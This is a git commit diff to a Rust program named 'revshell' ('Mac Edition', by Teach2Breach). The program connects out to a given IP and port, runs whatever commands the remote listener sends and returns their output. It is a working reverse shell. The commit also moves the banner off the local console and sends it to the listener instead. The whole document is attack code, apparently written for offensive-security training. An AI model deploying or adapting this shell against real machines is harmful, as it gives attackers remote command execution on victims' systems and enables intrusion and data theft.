1b8fc62f1e6845ff022e489591b5b95443736f91
Teach2Breach <105792760+Teach2Breach@users.noreply.github.com>
2023-03-02 13:54:19 -0600

    Update main.rs
    fixed some nonsense

--- rust/revshell/src/main.rs
+++ rust/revshell/src/main.rs
@@ -17,13 +17,26 @@ fn main() {
     let ip = &args[1];
     let port = &args[2];
 
-    // Print the banner and connect message to the user (you should probably change this :D )
-    println!("\u{1b}[32mRust RevShell v0.2 - Mac Edition");
-    println!("\u{1b}[32mBy: @Teach2Breach");
-    println!("\u{1b}[33mConnecting to {} on port {}", ip, port);
-
     // Create a TCP stream to the given address
     let mut stream = TcpStream::connect(format!("{}:{}", ip, port)).expect("Failed to connect");
+
+    //send the banner to the listener
+    let banner = "Rust RevShell v0.2 - Mac Edition";
+    stream.write(banner.as_bytes()).expect("Failed to write to stream");
+    //send a newline to the listener by creating a variable for a newline
+    let blank_line = " \n ";
+    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");
+    //stream.write(b" \r \r".as_bytes()).expect("Failed to write to stream");
+    //send "by @Teach2Breach" to the listener
+    let by = "By: @Teach2Breach";
+    stream.write(by.as_bytes()).expect("Failed to write to stream");
+    //send the newline
+    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");
+    //print "enter commands" to the listener
+    let enter_commands = "Enter commands: ";
+    stream.write(enter_commands.as_bytes()).expect("Failed to write to stream");
+    //send the newline
+    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");
 
     // Wait for shell commands to be sent
     loop {
@@ -35,18 +48,32 @@ fn main() {
                 //convert the buffer to a string for sending to Command
                 let cmd = String::from_utf8_lossy(&buf[0..n]);
                 //let cmd_string = cmd.to_string();
-                let mut output = Command::new(cmd.trim())
-                    .stdout(Stdio::piped())
-                    .spawn()
-                    .expect("Failed to execute command")
-                    .stdout
-                    .expect("Failed to get command output");
+                //check to make sure the command is not empty
+                if cmd.trim().is_empty() {
+                    continue;
+                }
+                //println!("Command: {}", cmd);
+                //if the command is exit, exit the program cleanly
+                if cmd.trim() == "exit" {
+                    std::process::exit(0);
+                }
 
-                let mut output_vec = Vec::new();
-                output.read_to_end(&mut output_vec).expect("Failed to read command output");
-                stream.write(&output_vec).expect("Failed to write to stream");
-            }
+                //else execute the command
+                else {
+                    let mut output = Command::new(cmd.trim())
+                        .stdout(Stdio::piped())
+                        .spawn()
+                        .expect("Failed to execute command")
+                        .stdout
+                        .expect("Failed to get command output");
+
+                    let mut output_vec = Vec::new();
+                    output.read_to_end(&mut output_vec).expect("Failed to read command output");
+                    stream.write(&output_vec).expect("Failed to write to stream");
+                }
+            },
             Err(err) => println!("Error: {}", err),
         }
     }
 }
+
